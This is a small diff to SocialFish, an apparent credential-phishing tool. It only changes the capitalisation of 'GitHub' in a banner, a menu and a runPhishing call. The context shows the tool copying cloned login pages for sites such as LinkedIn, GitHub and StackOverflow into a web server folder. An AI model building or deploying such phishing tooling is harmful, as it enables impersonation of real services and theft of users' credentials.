@@ -60,7 +60,7 @@ def end():
 
 [ {0}Follow me on Twitter:{1} https://twitter.com/A1S0N_ ]
 
-[ {0}Contribute on Github:{1} https://github.com/UndeadSec/SocialFish ]
+[ {0}Contribute on GitHub:{1} https://github.com/UndeadSec/SocialFish ]
 
 [ {0}Join our Telegram Group(Portuguese):{1} https://t.me/UndeadSec ]\n'''.format(GREEN, END, CYAN)
 
@@ -86,7 +86,7 @@ def runPhishing(social, option2):
         system('cp WebPages/google_advanced_poll/*.* Server/www/')   
     elif social == 'LinkedIn':
         system('cp WebPages/linkedin/*.* Server/www/')
-    elif social == 'Github':
+    elif social == 'GitHub':
         system('cp WebPages/github/*.* Server/www/')
     elif social == 'StackOverflow':
         system('cp WebPages/stackoverflow/*.* Server/www/')
@@ -156,9 +156,9 @@ def runPEnv():
         option2 = ''
         runPhishing('LinkedIn', option2)
     elif option == '4':
-        loadModule('Github')
+        loadModule('GitHub')
         option2 = ''
-        runPhishing('Github', option2)
+        runPhishing('GitHub', option2)
     elif option == '5':
         loadModule('StackOverflow')
         option2 = ''
